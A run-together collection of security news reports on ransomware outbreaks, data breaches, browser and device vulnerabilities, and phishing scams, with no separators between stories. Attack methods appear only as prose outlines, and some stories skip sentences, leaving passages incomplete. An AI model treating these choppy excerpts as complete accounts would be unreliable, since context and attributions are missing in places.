In March of 2016, Malwarebytes researcher Jérôme Segura discovered a KWIC customer, Norfolk General Hospital, had a compromised Joomla install that was being used to distribute Ransomware.
When Segura reached out to contact the hospital about the incident, they didn’t respond right away because the notification was viewed as a sales pitch.
KWIC thought a second Malwarebytes notification was a Phishing attack.
There are a number of unknowns connected to this incident, including the root cause, the number of people and businesses affected, and again - the length of time the data remained exposed to the public.
Other questions focus on the PHP shell scripts and DDoS tools, why were they there?
KWIC was contacted immediately after Salted Hash was informed about the data breach.
It took multiple attempts, as the company doesn't have phone support after 8:00 p.m. on weekdays, 3:00 p.m. on Saturdays (they're closed Sunday), but KWIC eventually responded via email.
Twenty-four hours after being notified, the company stated the Rsync issues were fixed,  However, they haven't answered any of the other follow-up questions asked by Salted Hash.
On Tuesday, via email, the company said an audit was underway and affected customers would be notified once it is complete.

Israel-based cyber security firm Check Point has detected a malware that is not downloaded due to users’ use but is already present in Android device.
According to a company blog post last week, the pre-installed malware was detected in 38 Android devices, belonging to a large telecommunications company and a multinational technology company.
“The malicious apps were not part of the official ROM supplied by the vendor, and were added somewhere along the supply chain,” the company said.
The malware added to the devices’ ROM could not be removed by the users, therefore, the devices had to be re-flashed.
The research team at Check Point found that one of the pre-installed malwares was Slocker, a mobile ransomware, that uses the Advanced Encryption Standard (AES) encryption algorithm to encrypt all files on the device and demand ransom in return for their decryption key.
“The most notable rough adnet which targeted the devices is the Loki Malware.
This complex malware operates by using several different components; each has its own functionality and role in achieving the malware’s malicious goal,” the cyber security firm said.
Pre-installed malwares steal data from the devices and are installed to system, taking full control of the device.
The cyber security firm suggested users to protect themselves from regular and pre-installed malware by implementing advanced security measures capable of identifying and blocking any abnormality in the device’s behaviour.

The results of an annual school survey administered by Western Albemarle High School (WAHS) were inadvertently exposed to the public in a serious breach of security and student privacy protocol.
In a post-breach letter to parents, WAHS principal, Darah Bonham, explained that the school’s Peer Nomination Survey “asks students to identify peers who either have been victims of bullying or have been responsible for bullying others.”
Bonham continued by revealing that a change to the survey exposed presumed confidential names of students listed on the survey:
    The survey is administered electronically and this morning, a change was made to add questions having to do with student needs around technology. Regrettably, this change inadvertently altered the security settings, making publically accessible, some survey information reported by students. It did not make public the names of students who provided that information.
While WAHS has given assurances that the names of those submitting data to the survey were not exposed, concerned parents, students, and teachers were not assuaged.

West Haven officials said Thursday they paid the money to anonymous attackers through the digital currency Bitcoin.
A Connecticut city has paid USD 2,000 to restore access to its computer system after a ransomware attack.
West Haven officials said Thursday they paid the money to anonymous attackers through the digital currency bitcoin to unlock 23 servers and restore access to city data.
The attack disabled servers early Tuesday morning, and city officials say it was contained by 5:30 PM Wednesday.
City attorney Lee Tiernan says officials initially didn't want to pay the ransom, but research showed it was the best course of action.

A ransomware threat called SLocker, which accounted for one-fifth of Android malware attacks in 2015, is back with avengeance, according to security firm Wandera. 
SLocker encrypts images, documents and videos on Android devices and demands a ransom to decrypt the files. Once the malware is executed, it runs in the background of a user's device without their knowledge or consent.
Once it has encrypted files on the phone, the malware hijacks the device, blocking the user's access, and attempts to intimidate them into paying a ransom to unlock it.
Last year, security company Bitdefender said that ransomware was the largest malware risk to Android users in the second half of 2015 - with SLocker accounting for 22 per cent of Android malware threats in the UK in that period.
The malware also topped the ransomware charts in Germany and Australia, and Bitdefender claimed that 44 per cent of Android users it asked had already paid out a ransom in order to regain access to their devices.
The malware continued to cause problems and, in mid-2016, its attacks were estimated to have resulted in tens of millions of dollars in ransoms paid. Weeks after the initial wave of attacks, security companies patched the issue for their enterprise customers, devices were updated and the threat disappeared.
That is until now. Mobile security firm Wandera said that its mobile intelligence engine MI:RIAM had detected more than 400 variants of the same malware. It said that these strains were targeting businesses' mobile fleets through easily accessible third-party app stores and websites where security checks are not as rigorous as they ought to be.
According to Wandera, the variants have been redesigned and repackaged to avoid all known detection techniques.
""They utilise a wide variety of disguises including altered icons, package names, resources and executable files in order to evade signature-based detection,"" the company said.
Third-party app stores and unknown vendors should be avoided by Android users, while corporate administrators should be wary of SLocker returning and put in place security measures to monitor devices accordingly.

Eurostar has forced all of its customers to reset their passwords after detecting an ""unauthorised attempt"" to hack into its systems and access their accounts. 
Customers reported receiving an email on Tuesday stating that the company had identified an attempt to access eurostar.com accounts using users' email and passwords between the 15 and 19 of October. 
Eurostar confirmed that credit card details and payment details were not compromised because the company does not store that information online. 
Eurostar has yet to confirm how many people have been affected by this data breach or whether any data has been taken. 
The company has reported the data breach to the Information Commissioner's Office.
""We have taken this action as a precaution because we identified what we believe to be an unauthorised automated attempt to access eurostar.com accounts using your email address and password,"" the company told customers. 
""We've since carried out an investigation which shows that your account was logged into between the 15 and 19 October. If you didn't log in during this period, there's a possibility your account was accessed by this unauthorised attempt.""
Customers were told to check their accounts for ""anything unusual"" and update login details on any other site where they use the same password.
A Eurostar spokesman said: ""This email was sent after we identified what we believe to be an unauthorised automated attempt to access customer accounts, so as a precaution, we asked all account holders to reset their password. We deliberately never store any payment details or bank card information, so there is no possibility of those being compromised.""
An ICO spokesman said: “We’ve received data breach report from Eurostar and are making enquiries.”

A day after a Navi Mumbai hospital and hotel became targets of a ransomware attack, cyber fraudsters encrypted data belonging to a Dadar-based chartered accountant and demanded money to remove the block on the data on Monday. While the incident took place on Monday, the complainant, realised that his data has been blocked on Tuesday. “A case of ransomware was reported, following which, an FIR has been registered at the Bhoiwada police station,” said Deputy Commissioner of Police (Zone 4) N Ambika.
While the FIR was lodged on Thursday, no arrest has been made in the case yet. Police said the incident took place on Monday at the complainant’s office near Framroz court in Dadar. Around 2.15 pm, a message flashed on the complainant’s computer screen saying, “You have to pay for decryption in bitcoins. The price depends on how fast you write to us. After payment, we will send you the decryption key, which will decrypt all your files.” The message also had an email address, on which he was to write to the fraudsters.
Around 7 pm, when the complainant tried to use a computer for some work, he could not access the data. When he tried other computers, he faced the same problem. He also found that some data and software had been deleted. Suspecting that a computer virus may be behind this, he copied the other files still available from the computer.
The complainant then left for the day and asked an employee from the information technology department to look into the matter. The employee later told him that the data had not been deleted but encrypted by fraudsters.
On Sunday, the MGM hospital in Navi Mumbai was attacked by a ransomware. Its data was locked out and the fraudsters demanded payment in bitcoins.

Argentinean security researcher Manuel Caballero has discovered another vulnerability in Microsoft's Edge browser that can be exploited to bypass a security protection feature and steal data such as passwords from other sites, or cookie files that contain sensitive information.
The vulnerability is a bypass of Edge's Same Origin Policy (SOP), a security feature that prevents a website from loading resources and code from other domains except its own.
To exploit the flaw, Caballero says that an attacker can use server redirect requests combined with data URIs, which would allow him to confuse Edge's SOP filter and load unauthorized resources on sensitive domains. The expert explains the attack step by step on his blog.
In the end, the attacker will be able to inject a password form on another domain, which the built-in Edge password manager will automatically fill in with the user's credentials for that domain. Below is a video of the attack.
Additionally, an attacker can steal cookies in a similar manner. More demos are available on a page Caballero set up here.
Two weeks ago, Caballero found another SOP bypass in Edge, which an attacker could also exploit to steal cookies and passwords. That particular exploit relied on a combination of data URIs, meta refresh tag, and domainless pages, such as about:blank.
Compared to the previous SOP bypass, the technique Caballero disclosed yesterday has the advantage that it's faster to execute compared to the first, which required the attacker to log users out of their accounts and re-authenticate them in order to collect their credentials.
Caballero has a history of finding severe bugs in Microsoft browsers. He previously also bypassed the Edge SOP using Edge's new Reading Mode, showed how you could abuse the SmartScreen security filter for tech support scams, and found a serious JavaScript attack in Internet Explorer 11 (still unpatched) .
What's more worrisome is that Microsoft has not patched any of the SOP bypass issues the expert discovered.
""We have 3 SOP bypasses right now,"" Caballero told Bleeping Computer today when asked to confirm the status of the three bugs.
This month's Patch Tuesday, released two days ago, patched the Edge SmartScreen issue Caballero discovered last December, but the researcher found a way to bypass Microsoft's patch within minutes.

Attackers continue to take aim at the e-commerce platform Magento.
Researchers said last week they came across a malicious function snuck into one of the platform’s modules in order to steal credit card information.
Code for the function was injected into a .php file for SF9 Realex, a module that helps sites store customer credit card data for the one-click checkout functionality commonly used by repeat customers.
The module interacts with the Realex RealAuth Remote and Redirect systems, “very popular solutions in the Magento community,” according to Bruno Zanelato, a researcher with the firm Sucuri, who found the malicious function.
The function, sendCCNumber(), reroutes credit card information entered by a customer from Magento to an attacker’s email address, hidden inside a variable later in the code.
The data, encoded in JSON, arrives in the attacker’s inbox without the victim being any the wiser.
According to researchers, the attacker uses binlist.net, a public web service for searching issuer identification numbers (IIN), to help identify which bank each card is associated with.
Zanelato said Friday that attackers are going greater lengths to target credit card data, especially in e-commerce platforms like Magento.
“Magento credit card stealers are indeed on the rise,” Zanelato wrote Friday, “While the information here is specific to Magento, realize that this can affect any platform that is used for ecommerce.
As the industry grows, so will the specific attacks targeting it”.
Zanelato is quick to point out that there wasn’t a vulnerability in Magento that enabled the theft of credit card data.
From there the attacker was able to inject script and takeover SF9 Realex.
It’s the latest in a line of credit card stealers Sucuri researchers have observed taking advantage of Magento, however.
Last summer Cesar Anjos, a researcher with the firm looked at one stealer that was loaded from another source.
The stealer essentially performed a man-in-the-middle attack between the user and the checkout page after credit card information was entered.
Last October, Ben Martin, a different researcher with the firm, discovered attackers scraping credit card numbers and exfiltrating them in obscure, sometimes publicly viewable image files.
Researchers with RiskIQ monitored attacks similar to ones described by Sucuri last year.
The firm said the attacks it had been monitoring originated from a single hacking group targeting e-commerce platforms such as Powerfront CMS and OpenCart with a web-based keylogger in March 2016.

iOS 10.3, released to the public on Monday, patches a bug that allowed bad actors to use a JavaScript pop-up in Safari in an attempt to extort money from iOS users.
Security firm Lookout (via Ars Technica) said the scammers would target Safari users who viewed pornography by placing malicious scripts on various pornographic website that would create an endless pop-up loop that basically locked the browser, if an uninformed user didn’t know how to get around the flaw.
    The scammers abused the handling of pop-ups in Mobile Safari in such a way that a person would be “locked” out from using Safari unless they paid a fee — or knew they could simply clear Safari’s cache (see next section). The attack was contained within the app sandbox of the Safari browser; no exploit code was used in this campaign, unlike an advanced attack like Pegasus that breaks out of the app sandbox to install malware on the device.
    The scammers registered domains and launched the attack from the domains they owned, such as police-pay[.]com, which the attackers apparently named with the intent of scaring users looking for certain types of material on the Internet into paying money.
The pop-ups claimed to be from law-enforcement personnel, and claimed the only way to get control of the browser back was to pay a fine in the form of an iTunes gift card code delivered via text message. Users actually could have gotten out of the pop-up loop by manually clearing the Safari browser cache. However, a new or otherwise uninformed user might believe they actually needed to pay the ransom before regaining control of their browser.
“The attackers effectively used fear as a factor to get what they wanted before the victim realized that there was little actual risk,” Lookout researchers Andrew Blaich and Jeremy Richards said.
iOS 10.3 changes the way pop-up dialogs work in Safari. Previously, a pop-up dialog took over the entire Safari app. Now, pop-ups are only per tab. iOS users who are hit by the scam before updating to iOS 10.3 can clear their browsing cache by going to “Settings” -> “Safari” and tapping: “Clear History and Website Data.”

Ransomware authors are nothing if not persistent. They continue to try new evasion techniques, new programming languages, new naming conventions, and even more forceful demand tactics to pressure victims into paying.
One new technique involves packaging ransomware in RarSFX executable files. Last week we talked about a multi-component variant of Cerber (detected as RANSOM_CERBER) found packaged in a SFX file, a feature that helps it evade machine learning. This week, we saw CrptXXX (detected by Trend Micro as RANSOM_CRPTX.A) also in a SFX package—most likely for the same reason. This particular ransomware cannot execute fully without the correct parameters and other components inside its package.
If CrptXXX successfully infects a system, the victim receives a relatively straightforward ransom note. They are instructed to go to a specific .onion site and input their unique ID, then follow the payment instructions.

French Locker (detected by Trend Micro as RANSOM_LELEOCK.A) is a typical ransomware made by developers who want to get paid quickly. This ransomware displays a 10 minute timer and deletes one of the victim's encrypted files for every 10 minutes that passes.
It arrives through malicious sites or is dropped by other malware, and victims can choose between English or a French version. Initially, the ransomware will install an autostart registry for its dropped copy, which triggers its encryption routine once the machine reboots. Encrypted files are appended with the .lelele extension.

SAMSAM has been updated with a new variant (detected by Trend Micro as RANSOM_SAMAS.I).The previous version made waves in 2016 after it targeted vulnerable hospital servers. Traditionally, ransomware spreads through social engineering, malvertisments, or spam—SAMSAM set itself apart when it targeted the network infrastructure of certain healthcare facilities. The threat actors behind this ransomware gain access to the administrative rights of a network and pinpoint specific target hosts. They deploy to a sizeable portion of the victim’s network, causing essential systems and services to shut down, leaving the target facility little choice but to pay the ransom.
This is one of the latest variants of SAMSAM, though this ransomware family constantly changes its behavior when its threat indicators or IOCs are made public.

The first ransomware to be written in Google’s Go programming language was detected late last year, and now we have another to add to the list. Apart from the programming language used, BrainCrypt (detected by Trend Micro as RANSOM_BRAINCRYPT) is a relatively standard ransomware. There are no specific details in the ransom note, just simple instructions explaining the situation and telling the victim to email the threat actors.
The continuing evolution of ransomware shows how cybercriminals quick to adopt the latest technology and techniques to make their malware more effective. Because of this, all users should stay vigilant and updated on the latest threat developments.

2016 brought massive password dumps, resulting from the highly publicized Yahoo and LinkedIn breaches that exposed millions of users’ passwords to the public and for sale on the dark web. Research has revealed that about 35% of the leaked LinkedIn passwords were already known from previous password dictionaries, making them vulnerable to other accounts.
Researchers at behavioral firewall company Preempt took a look at the LinkedIn credentials and also found that 65% of the leaked passwords can be easily cracked with brute force using standard off-the-shelf cracking hardware.
The study also looked at general password intelligence and found that password rules, which many enterprises employ, can allow users to create weak passwords that can easily be cracked—and many individuals use the same password for multiple accounts, signaling a password epidemic amongst organizations and their users.
“One thing is certain, any person that used the same password for Linkedin as they did for their work account (or other account), is currently vulnerable within these other accounts,” said Preempt researcher Eran Cohen, in a blog. “Unfortunately, there are many users that don’t make that connection. Their LinkedIn account was breached, so they just change their LinkedIn password, not realizing that if they are using that same password elsewhere, they are actually exposed in all of those places as well. For IT security teams, this is an unknown vulnerability they have to deal with.”
Overall, the examination showed that low-complexity passwords can be cracked in less than a day, medium-complexity passwords are cracked in less than a week and high-complexity password are cracked in less than a month.
“Users reuse passwords. They rotate them. Add a digit to them. And even use identical or share passwords with others,” said Cohen. “As data scientists, it is our job to go deeper, and identify the common human behavior. For example, we’ve seen how local culture impacts passwords, where local football team names are commonly used as passwords. The problem is that only about 1% of people care and are aware that passwords are based on patterns and these patterns can be tracked or broken.”
To stay safe, companies should use a password policy to enforce complexity and password expiration; require longer passwords (8 bad, 10 ok, 12 good); implement a context-based solution to train and enforce password policy based on users' activity; add additional factors to authenticate users; and educate people to avoid sharing passwords with other employees and cloud services. They should also avoid the use of simple patterns, personal data or common words; and employees shouldn’t repeat passwords when a password expires (enumeration included).

To understand why it is so difficult to defend computers from even moderately capable hackers, consider the case of the security flaw officially known as CVE-2017-0199.  
The bug was unusually dangerous but of a common genre: it was in Microsoft software, could allow a hacker to seize control of a personal computer with little trace, and was fixed April 11 in Microsoft’s regular monthly security update.  
But it had traveled a rocky, nine-month journey from discovery to resolution, which cyber security experts say is an unusually long time.  
Google’s security researchers, for example, give vendors just 90 days’ warning before publishing flaws they find. Microsoft Corp (MSFT.O) declined to say how long it usually takes to patch a flaw.  
While Microsoft investigated, hackers found the flaw and manipulated the software to spy on unknown Russian speakers, possibly in Ukraine.  
And a group of thieves used it to bolster their efforts to steal from millions of online bank accounts in Australia and other countries.  
Those conclusions and other details emerged from interviews with researchers at cyber security firms who studied the events and analyzed versions of the attack code.  
Microsoft confirmed the sequence of events.  
The tale began last July, when Ryan Hanson, a 2010 Idaho State University graduate and consultant at boutique security firm Optiv Inc in Boise, found a weakness in the way that Microsoft Word processes documents from another format. That allowed him to insert a link to a malicious program that would take control of a computer.  
The company often pays a modest bounty of a few thousands dollars for the identification of security risks.  
Soon after that point six months ago, Microsoft could have fixed the problem, the company acknowledged. But it was not that simple. A quick change in the settings on Word by customers would do the trick, but if Microsoft notified customers about the bug and the recommended changes, it would also be telling hackers about how to break in.  
Alternatively, Microsoft could have created a patch that would be distributed as part of its monthly software updates. But the company did not patch immediately and instead dug deeper. It was not aware that anyone was using Hanson’s method, and it wanted to be sure it had a comprehensive solution.  
“We performed an investigation to identify other potentially similar methods and ensure that our fix addresses [sic] more than just the issue reported,” Microsoft said through a spokesman, who answered emailed questions on the condition of anonymity. “This was a complex investigation.”  
Hanson declined interview requests.  
The saga shows that Microsoft’s progress on security issues, as well as that of the software industry as a whole, remains uneven in an era when the stakes are growing dramatically.  
Finally, on the Tuesday, about six months after hearing from Hanson, Microsoft made the patch available. As always, some computer owners are lagging behind and have not installed it.  
Ben-Gurion University employees in Israel were hacked, after the patch, by attackers linked to Iran who took over their email accounts and sent infected documents to their contacts at technology companies and medical professionals, said Michael Gorelik, vice president of cyber security firm Morphisec.  
When Microsoft patched, it thanked Hanson, a FireEye researcher and its own staff.  
A six-month delay is bad but not unheard of, said Marten Mickos, chief executive of HackerOne, which coordinates patching efforts between researchers and vendors.  
“Normal fixing times are a matter of weeks,” Mickos said.  
Privately-held Optiv said through a spokeswoman that it usually gives vendors 45 days to make fixes before publishing research when appropriate, and that it “materially followed” that practice in this case.  
If the patching took time, others who learned of the flaw moved quickly.  
On the final weekend before the patch, the criminals could have sold it along to the Dridex hackers, or the original makers could have cashed in a third time, Hultquist said, effectively staging a last clearance sale before it lost peak effectiveness.  
It is unclear how many people were ultimately infected or how much money was stolen.

UPDATE At DEFCON 22 in 2014, researchers demonstrated hacks against the Samsung Smartcam that allowed an attacker to remotely take over the device.
Samsung’s reaction at the time was to remove the web interface enabling the attack rather than patch the code in question.
The Exploitee.rs, formerly the GTVHacker group, said users weren’t pleased with the response and in turn, decided to take another crack at analyzing the device for vulnerabilities.
On Saturday, the group publicly disclosed a remote code execution bug it found in the SNH-1011 Smartcam, and cautioned that it likely exists in all Samsung Smartcam devices.
“The vulnerability occurs because of improper sanitization of the iWatch firmware update filename,” the group wrote in a technical description of the vulnerability that also included a proof-of-concept exploit and instructions on how to patch the flaw.
“A specially crafted request allows an attacker the ability to inject his own command providing the attacker remote root command execution”.
A request for comment from Samsung was not returned in time for publication.
A Samsung contact told Threatpost that the vulnerability affects only the SNH-1011 model and it will be removed in an upcoming firmware update.
The Exploitee.rs said they were motivated to look further at the cameras because of Samsung’s response to their first disclosure.
“This angered a number of users and crippled the device from being used in any DIY monitoring solutions.
So, we decided to audit the device once more to see if there is a way we can give users back access to their cameras while at the same time verifying the security of the devices new firmware”.
The original response looks especially weak in a climate where connected devices are being especially scrutinized for their security.
“While this flaw by default would not directly allow attacks from the Internet suitable for something like Mirai, it would be pretty trivial to use CSRF to infect devices on home networks,” Tripwire principal security researcher Craig Young said.
“It is always disappointing when a vendor eliminates features rather than fixing vulnerabilities as was the case in this camera”.
While the original issue from 2014 has been addressed, the Exploitee.rs wrote that what remains of the web interface includes a set of PHP scripts that allow the camera’s firmware to be updated through the iWatch webcam monitoring service.
“These scripts contain a command injection bug that can be leveraged for root remote command execution to an unprivileged user,” they said.
The researchers said the flaw in iWatch can be exploited through a special filename stored in a tar command that is passed to a php system call.
“Because the web-server runs as root, the filename is user supplied, and the input is used without sanitization, we are able to inject our own commands within to achieve root remote command execution,” they said.
ASUS patched a bug that allowed attackers to pair two vulnerabilities to gain direct router access and execute commands as root.

De Ceukelaire has discovered that he can exploit Facebook to obtain cell phone numbers of users; which they want to remain hidden.
According to De Ceukelaire, he can easily identify the cell phone numbers of well-known personalities including top politicians and “Flemish” celebs simply through checking out their Facebook profile.
This is done by analyzing the numbers that are associated with their profiles.
It must be noted that these numbers are supposed to be confidential information and aren’t viewable by the public.
Must Read: Hacking Facebook Account by Knowing Account Phone Number
Reportedly, De Ceukelaire proved his claim by obtaining the cell number of Jan Jambon, the Interior Minister for Belgium, through his Facebook profile.
He further stated that: “For clarity, I could find out his number on his account, not vice versa; roughly, I think you get the number 20 percent of the Flemish people can find that way.
Of all the people who have their mobile number linked to their profile goes to the 80 percent”.
De Ceukelaire already warned the Facebook security team twice about this issue and stated that he might expose it to the public if the social network does not fix the issue and make necessary changes.
However, according to Facebook’s representatives, this isn’t a vulnerability that has been exploited but a feature.
He also notified law enforcement authorities about the exploitable aspect of this feature.
“If the users enter their private phone numbers and don’t lock them down in the privacy settings section, chances of a privacy leak are quite bright”.
Facebook informed De Ceukelaire about how to control the searching criteria, that is, who can search for you through your phone number or email address but De Ceukelaire asserts that this is a privacy leak because phone numbers are visible to the public while these are supposed to remain confidential.
This problem was identified way back in 2012 because the cell number’s setting could not be set to visible by “Only Me”.
Facebook did make some modifications in its privacy settings feature, due to which only a limited number of reverse lookups would come from a particular IP address.
This happened after a security researcher managed to access thousands of random phone numbers.
But, it is apparent that the problem hasn’t been fixed even today.
It is worth noting that De Ceukelaire didn’t release details about how he managed to exploit Facebook to conduct this privacy leak and whether he used any different method than previous security researchers or not.
But, yet again Facebook is paying no heed to his pleas of getting this feature fixed and he has been given the same ‘Feature not Flaw’ reply this time as well.

Foxit has patched more than 118 vulnerabilities in its PDF reader, some of which could be exploited to enable full remote code execution.
Patches were released last week for Foxit Reader 9.3 and Foxit PhantomPDF 9.3 to address a huge number of issues in the programs.
This security bulletin released by Foxit provides details on the extensive list of vulnerabilities, which were discovered via internal research, end user reports, and reports from research teams.
More than 118 issues were addressed, though there was some overlap, and so the number of actual bugs was lower.
Vulnerable versions are 9.2.0.9297 and earlier, and only affect Windows users.
A significant number of flaws were classed as ‘critical’ and could allow for remote code execution – 18 were reported by Cisco Talos, all of which were dubbed high in severity.
Several were use-after-free flaws, which allows memory to be accessed after it has been freed and can enable hackers to execute arbitrary code and take over the system.
Cisco Talos wrote in a report: “There are a couple of different ways an adversary could leverage this attack including tricking a user to opening a specially crafted, malicious PDF or, if the browser plugin is enabled, the user could trigger the exploit by viewing the document in a web browser.”
Foxit told The Daily Swig that its programs were embedded with security features designed to protect its users from malicious actors.
These include a ‘Safe Mode’, which “prevents suspicious external commands to be executed by Foxit Reader”, and the option to disable JavaScript.
The company also urged its users to update to the latest version.
A spokesperson told The Daily Swig: “Overall, Foxit Reader has had over 525 million downloads, but obviously they are not all active users on the latest release.
“In Foxit Reader, we have a Safe Mode which prevents suspicious external commands to be executed by Foxit Reader. Therefore, we don’t know how many folks are running without Safe Mode enabled.”
However, this security feature was bypassed not just once, but twice, by researchers last year.
Foxit added: “For a number of reasons, including bug fixes, we always advise users to download and install the latest release. Also, run the product in Safe Mode whenever possible.”

A serious vulnerability in a widely used, and widely forked, jQuery file upload plugin may have been exploited for years by hackers to seize control of websites – and is only now patched.
Larry Cashdollar, a bug-hunter at Akamai, explained late last week how the security shortcoming, designated CVE-2018-9206, allows a miscreant to upload and execute arbitrary code as root on a website that uses the vulnerable code with the Apache web server. This would potentially allow an attacker to, among other things, upload and run a webshell to execute commands on the target machine to steal data, change files, distribute malware, and so on.
Cashdollar – real name, he swears – was able to track the flaw down to Sebastian Tschan's open-source jQuery File Upload tool, and got the developer to fix it in version 9.22.1.
The flaw stems from a change to the Apache web server, from version 2.3.9 and onwards, that disabled support for .htaccess security configuration files, which left projects like jQuery File Upload open to exploitation.
Additionally, Cashdollar noted, it is almost certain he was not the first person to come across this simple vulnerability. Demonstration videos on YouTube suggest similar flaws are known to miscreants, and have been targeted in some circles for years.
""The internet relies on many security controls every day in order to keep our systems, data, and transactions safe and secure,"" Cashdollar said. ""If one of these controls suddenly doesn't exist it may put security at risk unknowingly to the users and software developers relying on them.""
So, it's believed hackers have been quietly exploiting the bug for several years as the flaw itself is fairly trivial and also eight years old. Now that details of the vulnerability are public, exploit code has been produced, for example, here, and may be handy if you wish to test whether or not your website is vulnerable to CVE-2018-9206. In any case, loads of people now know about it, so that means more miscreants menacing and hijacking vulnerable websites.

Conmen are taking phishing scams to the next level, targeting Apple users with emails and calls to a fake Apple Care service. While emails are a fairly common way of luring victims, it’s not every day that you hear about calls being involved to dupe folks.
Ars Technica reports that the attack begins with an email which is designed to look like an official iCloud account warning. It claims a sign-in attempt was blocked on their account since someone tried to use their password. There’s a “Check Activity” button which opens up a page on a compromised site for a men’s salon in South India.
The webpage immediately redirects the victim to another site, followed by another redirection to a fake Apple Support page asking them to contact support since their iPhone has been locked due to illegal activity. If they fall for the bait, the site launches a “scanning” box which eventually gives way to a pop-up box prompting the victim to call a number.
If the email is opened in an iPhone, the number can be called straightaway. iPads and Macs can’t do the same, so the system will ask if they want to open it in FaceTime. The publication actually dialed the number and got in touch with someone who described themselves as “Lance Roger from Apple Care.”
It seems the elaborate scheme is targeting email addresses associated with iCloud. The end game is to trick iPhone users into enrolling in a rogue mobile device management service. This allows the attackers to push infected apps onto the victim’s device, all the while pretending this is a part of Apple’s security service.
The phishing site is still live right now, but both Google and Apple have marked it as deceptive. Ars Technica has additionally passed on the technical details of the scam to an Apple security team member. The company told Engadget that it has resources on its support website to help people tell right from wrong. Everyday iOS users could still easily get fooled though.

Two Iranian men already indicted in New Jersey in connection with a broad cybercrime and extortion scheme targeting government agencies, cities and businesses now face new federal charges in Georgia related to a ransomware attack that caused havoc for the city of Atlanta earlier this year.
A federal grand jury in Atlanta returned an indictment Tuesday accusing Faramarz Shahi Savandi and Mohammad Mehdi Shah Mansouri of violating the Computer Fraud and Abuse Act, federal prosecutors said in a news release Wednesday. The New Jersey indictment against the pair was filed last month on broad conspiracy charges that included the Atlanta cyberattack.
Byung “BJay” Pak, the U.S. attorney in Atlanta, said in a news release that the Atlanta indictment was sought in coordination with the earlier indictment and seeks to ensure that “those responsible for the attacks face justice here as well.”
The Atlanta indictment accuses the two men of launching a ransomware attack against Atlanta that encrypted vital city computer systems. The attack significantly disrupted city operations and caused millions of dollars in losses, prosecutors said.
The Department of Justice has said the two men remain fugitives and are believed to be in Iran, though they are not believed to be connected to the Iranian government. No attorney was listed for either man in online court records.
In the Atlanta attack, a ransomware known as SamSam was used to infect about 3,789 computers belonging to the city, prosecutors said. The ransomware encrypted the files on the computers and showed a ransom note demanding payment for a decryption key.
The note demanded 0.8 bitcoin per affected computer or six bitcoin to decrypt all affected computers. Atlanta Mayor Keisha Lance Bottoms said in the days after the ransomware attack that the ransom demand was equivalent to $51,000.
The ransom note provided a bitcoin address to pay the ransom and a website accessible only on the dark web, where it said the city could retrieve the decryption key, prosecutors said. The decryption key became inaccessible shortly after the attack, and the city didn’t pay the ransom, prosecutors said.
The New Jersey indictment filed Nov 27 accuses the two men of creating the SamSam ransomware and says it was used to encrypt the computers of more than 200 victims, including government agencies, cities and businesses. Among the other victims are the city of Newark, New Jersey, the Colorado Department of Transportation, the Port of San Diego and six health care companies across the U.S., according to the Justice Department.
The New Jersey charges include conspiracy to commit wire fraud and conspiracy to commit fraud and related activity in connection with computers. The overall scheme allowed the hackers to make about $6 million and caused the victims to lose more than $30 million, prosecutors said.

Ransomware scammers have been exploiting a flaw in Apple's Mobile Safari browser in a campaign to extort fees from uninformed users.
The scammers particularly target those who viewed porn or other controversial content.
Apple patched the vulnerability on Monday with the release of iOS version 10.3.
The flaw involved the way that Safari displayed JavaScript pop-up windows.
In fact, recovering from the pop-up loop was as easy as going into the device settings and clearing the browser cache.
This simple fix was possibly lost on some uninformed targets who were too uncomfortable to ask for outside help.
""The attackers effectively used fear as a factor to get what they wanted before the victim realized that there was little actual risk,"" Lookout researchers Andrew Blaich and Jeremy Richards wrote in Monday's post.
The user provided the screenshot shown above, which attempts to instill fear with the claim the device was being locked ""for illegal pornography.""
Below those words was a pop-up Window that said ""Cannot Open Page.""
Each time the person clicked on the accompanying OK button, a new window would open again.
The JavaScript used in the attack shows signs of being used to exploit the same Safari flaw present in iOS version 8, which was released in 2014.
The attackers, the Lookout researchers said, purchased a large number of domains in an attempt to ""catch users that are seeking controversial content on the internet and coerce them into paying a ransom to them.""
Sites tailored the messages they delivered based on country identifiers.
The campaign in many respects resembles one that hit Android users in 2014.
That one demanded a $300 ransom paid in the form of mechanisms such as Paysafecard or uKash.

Yahoo’s board has blamed unnamed senior executives and its legal team for failing to properly investigate a 2014 security incident which saw 500 million user accounts stolen by state-sponsored attackers.
In a lengthy SEC filing, the board claimed that in late 2014 the firm’s security team notified of targeted attacks against 26 users, who were subsequently informed, and law enforcement consulted.
It continued:
“While significant additional security measures were implemented in response to those incidents, it appears certain senior executives did not properly comprehend or investigate, and therefore failed to act sufficiently upon, the full extent of knowledge known internally by the Company’s information security team.
Specifically, as of December 2014, the information security team understood that the attacker had exfiltrated copies of user database backup files containing the personal data of Yahoo users but it is unclear whether and to what extent such evidence of exfiltration was effectively communicated and understood outside the information security team”.
Subsequent cookie forging activity by the same state actor in 2015 and 2016 was also not investigated.
That activity is now said to have exposed the accounts of 32 million users.
The revelations would seem to indicate a massive disconnect between IT security and the business at Yahoo – perhaps one of the reasons why former CISO Alex Stamos left for Facebook in 2015.
It should be a cautionary tale for businesses everywhere, as the fallout continues.
General counsel and secretary, Ronald Bell, will leave the company as a result of the investigation with no severance pay, and CEO Marissa Meyer will not receive a cash bonus for 2016.
She has also agreed not to receive her 2017 annual equity award – which is said to be more than $10m.
The firm revealed it has already recorded $16m in losses related to the 2013 and 2014 breaches – “of which $5 million was associated with the ongoing forensic investigation and remediation activities and $11 million was associated with nonrecurring legal costs”.
Also, it is expecting to incur further “investigation, remediation, legal, and other expenses” going forward.
A large portion of this could come from the 43 consumer class action lawsuits which have since been instigated against the firm, with possibly more to come.
However, frustratingly, there was no more information on the 2013 breach of one billion user accounts, with the filing only saying the following:
“We have not been able to identify the intrusion associated with this theft, and we believe this incident is likely distinct from the 2014 Security Incident”.
The internet pioneer last week agreed a $350m cut in its asking price with Verizon, which will look to wrap up its M&A deal soon.

Samsung’s televisions and wearables reportedly have serious vulnerabilities that could allow malicious hackers to remotely take control of them.
Security researchers in Israel have uncovered 40 previously undiscovered vulnerabilities in the operating system running in Samsung’s line of smart televisions, smartwatches, and even mobile phones, which could give hackers easy access to the devices, Motherboard is reporting after discussing the findings with the researchers.
Tens of millions of electronics could be at risk, security researcher Amihai Neiderman told Motherboard.
The security flaws are living inside Tizen, an operating system Samsung (SSNLF) has been developing over the last several years that runs on the company’s televisions, smartwatches, and some low-powered mobile devices.
